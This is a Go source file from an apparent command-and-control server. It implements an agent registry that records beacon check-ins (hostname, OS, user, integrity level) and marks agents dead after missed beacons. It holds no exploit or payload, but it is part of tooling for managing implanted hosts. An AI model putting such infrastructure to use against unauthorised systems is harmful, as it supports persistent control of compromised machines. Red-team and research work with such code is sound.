package c2server

import (
	"sync"
	"time"

	"github.com/sirupsen/logrus"
)

const (
	DefaultBeaconInterval = 30 * time.Second
	AgentTimeout          = 3 * DefaultBeaconInterval
	PruneInterval         = 60 * time.Second
)

type AgentRegistry struct {
	mu     sync.RWMutex
	agents map[string]*AgentInfo
	stop   chan struct{}
}

func NewAgentRegistry() *AgentRegistry {
	return &AgentRegistry{
		agents: make(map[string]*AgentInfo),
		stop:   make(chan struct{}),
	}
}

func (r *AgentRegistry) Start() {
	go r.pruneLoop()
}

func (r *AgentRegistry) Stop() {
	close(r.stop)
}

func (r *AgentRegistry) Checkin(req CheckinRequest) *AgentInfo {
	r.mu.Lock()
	defer r.mu.Unlock()

	now := time.Now()
	agent, exists := r.agents[req.AgentID]
	if !exists {
		agent = &AgentInfo{
			ID:        req.AgentID,
			Hostname:  req.Hostname,
			OS:        req.OS,
			Arch:      req.Arch,
			PID:       req.PID,
			User:      req.User,
			Integrity: req.Integrity,
			FirstSeen: now,
		}
		r.agents[req.AgentID] = agent
		logrus.Infof("new agent registered: %s (%s/%s @ %s)", req.AgentID, req.OS, req.Arch, req.Hostname)
	}

	agent.Hostname = req.Hostname
	agent.OS = req.OS
	agent.Arch = req.Arch
	agent.PID = req.PID
	agent.User = req.User
	agent.Integrity = req.Integrity
	agent.LastSeen = now
	agent.Alive = true

	return agent
}

func (r *AgentRegistry) Get(agentID string) (*AgentInfo, bool) {
	r.mu.RLock()
	defer r.mu.RUnlock()
	agent, ok := r.agents[agentID]
	if !ok {
		return nil, false
	}
	copy := *agent
	return &copy, true
}

func (r *AgentRegistry) List() []AgentInfo {
	r.mu.RLock()
	defer r.mu.RUnlock()

	result := make([]AgentInfo, 0, len(r.agents))
	for _, a := range r.agents {
		result = append(result, *a)
	}
	return result
}

func (r *AgentRegistry) Remove(agentID string) {
	r.mu.Lock()
	defer r.mu.Unlock()
	delete(r.agents, agentID)
}

func (r *AgentRegistry) pruneLoop() {
	ticker := time.NewTicker(PruneInterval)
	defer ticker.Stop()

	for {
		select {
		case <-r.stop:
			return
		case <-ticker.C:
			r.markDead()
		}
	}
}

func (r *AgentRegistry) markDead() {
	r.mu.Lock()
	defer r.mu.Unlock()

	now := time.Now()
	for _, agent := range r.agents {
		if agent.Alive && now.Sub(agent.LastSeen) > AgentTimeout {
			agent.Alive = false
			logrus.Warnf("agent %s timed out (last seen %s ago)", agent.ID, now.Sub(agent.LastSeen).Round(time.Second))
		}
	}
}
